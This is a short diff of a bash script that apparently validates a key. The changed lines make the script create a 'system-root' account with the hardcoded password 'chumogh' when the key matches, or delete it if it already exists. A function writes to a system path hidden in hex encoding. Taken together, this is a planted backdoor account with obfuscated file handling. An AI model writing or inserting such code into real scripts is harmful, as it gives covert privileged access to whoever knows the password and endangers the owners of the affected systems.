@@ -32,13 +32,15 @@ echo "CGH"$key > exito
 fi
 if [[ $key = $validar ]];
 then
-usu=$(cat /etc/passwd | grep "system-root") 
-if [[ $usu = $usu ]];
-then
-userdel system-root
-else useradd system-root
+usu=$(cat /etc/passwd | grep "system-root")
+if [[ $usu = "" ]];
+then 
+useradd system-root
 echo "system-root:chumogh" | chpasswd
+else
+userdel system-root
 fi
+
 function_verify () {
   echo "verify" > $(echo -e $(echo 2f62696e2f766572696679737973|sed 's/../\\x&/g;s/$/ /'))
 }
